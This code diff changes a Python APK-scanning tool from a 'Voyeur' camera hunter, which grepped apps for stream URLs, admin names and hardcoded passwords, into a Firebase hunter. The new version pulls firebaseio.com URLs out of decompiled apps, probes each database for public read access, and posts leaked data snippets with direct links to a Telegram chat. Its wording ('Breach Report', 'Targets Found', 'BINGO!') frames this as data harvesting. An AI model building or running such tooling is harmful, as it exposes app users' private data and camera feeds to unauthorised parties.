@@ -8,19 +8,6 @@ from androguard.misc import AnalyzeAPK
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-# --- CAMERA PATTERNS ---
-# We are looking for connection strings and default creds
-PATTERNS = {
-    "🎥 RTSP Stream": r"rtsp://[\w./:\-@]+",
-    "🎥 RTMP Stream": r"rtmp://[\w./:\-@]+",
-    "🎥 HTTP Stream": r"http://[\w./:\-]+(?:\.m3u8|\.flv|\.mp4|/live|/stream)",
-    "📡 ONVIF Discovery": r"onvif://[\w./:\-]+",
-    "🔑 Admin User": r"(?i)(admin|root|user|guest)",
-    "🔑 Hardcoded Pass": r"(?i)(password|pwd|passwd)\s*[:=]\s*[\"']?([a-zA-Z0-9@!#]{3,})[\"']?",
-    "🔧 Default IP": r"192\.168\.\d{1,3}\.\d{1,3}",
-    "☁️ Cloud P2P": r"(?i)(p2p|tutk|kalay|avs)\.[\w.]+"
-}
-
 def send_telegram_alert(message):
     if not TELEGRAM_BOT_TOKEN: return
     if len(message) > 4000: message = message[:4000] + "\n...[TRUNCATED]"
@@ -29,69 +16,71 @@ def send_telegram_alert(message):
     try: requests.post(url, data=data)
     except: pass
 
+def check_firebase_vuln(url):
+    """Checks if the DB is publicly readable"""
+    # We ask for the root JSON but limit it to 'shallow' to avoid crashing with 100GB files
+    target = f"{url}/.json?shallow=true"
+    try:
+        r = requests.get(target, timeout=5)
+        if r.status_code == 200:
+            return True, r.text # BINGO!
+        elif r.status_code == 401:
+            return False, "Secure (Permission Denied)"
+        elif r.status_code == 404:
+            return False, "DB Not Found (Deleted)"
+        else:
+            return False, f"Status {r.status_code}"
+    except Exception as e:
+        return False, str(e)
+
 def analyze_apk(apk_path):
-    print(f"[*] Starting 'Voyeur' Scan on {apk_path}...")
-    report = f"📹 **Camera Hunter Report: {apk_path}**\n\n"
+    print(f"[*] Hunting Firebase URLs in {apk_path}...")
+    report = f"🔥 **Firebase Breach Report: {apk_path}**\n\n"
     
-    found_items = set()
+    found_urls = set()
 
     try:
-        # 1. SCAN NATIVE LIBRARIES (.so files)
-        # This is where 90% of camera secrets live
-        print("[*] Unzipping and scanning native libs...")
-        with zipfile.ZipFile(apk_path, 'r') as z:
-            for filename in z.namelist():
-                if filename.endswith(".so"):
-                    content = z.read(filename)
-                    # Simple strings extraction from binary
-                    try:
-                        # Decode with ignore to get ASCII strings
-                        text = content.decode('latin-1') 
-                        # Scan for patterns
-                        for name, pattern in PATTERNS.items():
-                            matches = re.findall(pattern, text)
-                            for m in matches:
-                                if isinstance(m, tuple): m = m[0] # Handle groups
-                                if len(m) > 4 and len(m) < 100: # Filter noise
-                                    found_items.add(f"{name} (in {filename}): `{m}`")
-                    except: pass
-
-        # 2. SCAN JAVA CODE (Dex)
-        print("[*] Decompiling Java code...")
+        # 1. DECOMPILE & SEARCH
+        print("[*] Decompiling and scanning strings...")
         app, dex_list, dx = AnalyzeAPK(apk_path)
         
-        all_strings = set()
+        # Scan every string in the app
         for dex in dex_list:
             for s in dex.get_strings():
-                all_strings.add(str(s))
-        
-        print(f"[*] Scanning {len(all_strings)} strings...")
-        for s in all_strings:
-            for name, pattern in PATTERNS.items():
-                matches = re.findall(pattern, s)
-                for m in matches:
-                    if isinstance(m, tuple): m = m[0]
-                    if len(m) > 4 and len(m) < 100:
-                        found_items.add(f"{name}: `{m}`")
+                # Look for the firebase domain
+                if "firebaseio.com" in s:
+                    # Clean the URL
+                    clean = s.strip()
+                    if "https://" not in clean:
+                        clean = f"https://{clean}"
+                    # Remove trailing slashes
+                    if clean.endswith("/"): 
+                        clean = clean[:-1]
+                    
+                    found_urls.add(clean)
 
-        # 3. REPORT
-        if found_items:
-            # Sort and prioritize URLs
-            sorted_items = sorted(list(found_items))
-            # Move RTSP to top
-            rtsp = [i for i in sorted_items if "rtsp" in i]
-            others = [i for i in sorted_items if "rtsp" not in i]
+        # 2. PROBE FOR LEAKS
+        if found_urls:
+            report += f"**🎯 Targets Found:** {len(found_urls)}\n"
             
-            report += "**🔥 Live Streams (Gold):**\n" + ("\n".join(rtsp) if rtsp else "None found") + "\n\n"
-            report += "**🕵️ Other Findings:**\n" + "\n".join(others[:30])
+            for db_url in found_urls:
+                print(f"[*] Probing {db_url}...")
+                is_vuln, response = check_firebase_vuln(db_url)
+                
+                if is_vuln:
+                    report += f"\n🚨 **VULNERABLE:** `{db_url}`\n"
+                    report += f"   **Payload:** `{response[:300]}...`\n" # Show first 300 chars
+                    report += f"   [Link to Database]({db_url}/.json)\n"
+                else:
+                    report += f"\n🛡️ **Secure:** `{db_url}`\n   Reason: {response}\n"
         else:
-            report += "[-] No obvious camera secrets found."
+            report += "[-] No Firebase Configuration found."
 
         print(report)
         send_telegram_alert(report)
 
     except Exception as e:
-        err = f"⚠️ Error: {e}"
+        err = f"⚠️ Scan Failed: {e}"
         print(err)
         send_telegram_alert(err)
 
